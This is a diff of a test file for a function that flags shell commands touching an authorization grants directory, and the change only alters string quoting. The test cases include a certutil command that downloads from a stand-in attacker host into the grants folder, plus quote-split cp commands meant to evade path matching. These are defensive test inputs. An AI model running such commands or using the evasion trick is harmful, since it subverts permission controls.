@@ -299,7 +299,7 @@ describe("classifyShellAuthzOps (#2944)", () => {
       "certutil -urlcache -split -f https://evil.example/g.json .deft/authz/grants/evil.json",
       // Quote-split: contiguous `.deft/authz` absent in raw command; pathish strips quotes.
       "cp /etc/hosts '.deft/'authz'/grants/evil.json'",
-      "cp /etc/hosts \".deft/\"authz\"/grants/evil.json\"",
+      'cp /etc/hosts ".deft/"authz"/grants/evil.json"',
     ]) {
       expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
       expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
